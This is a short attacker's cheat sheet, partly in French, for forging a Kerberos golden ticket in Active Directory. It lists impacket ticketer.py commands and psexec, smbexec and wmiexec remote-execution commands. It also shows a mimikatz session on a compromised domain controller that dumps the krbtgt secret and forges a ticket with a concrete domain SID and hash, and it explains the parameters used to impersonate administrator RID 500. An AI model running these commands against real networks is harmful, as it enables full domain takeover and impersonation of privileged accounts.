# golden ticket

## To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

## To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

## Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

## Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass



## sur le DC compromi lancer mimikatz

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : <...SNIP...>


kerberos::golden /domain:dimotrans.local /sid:S-1-5-21-660215690-1101628366-3719296297 /user:oturan /id:500 /rc4:371c7b9ee2e498b84aaa9dd166f54789 /ptt

• User – The name of the user account the ticket will be created for. This can be a real account name but it doesn’t have to be.
• ID – The RID of the account you will be impersonating. This could be a real account ID, such as the default administrator ID of 500, or a fake ID.
• Groups – A list of groups to which the account in the ticket will belong. This will include Domain Admins by default so the ticket will be created with the maximum privileges.
• SIDs – This will insert a SID into the SIDHistory attribute of the account in the ticket. This is useful to authenticate across domains
• RC4 = hash NTLMmimik

pour utiliser le ticket lancer un prompt:

misc::cmd 

whoami /all


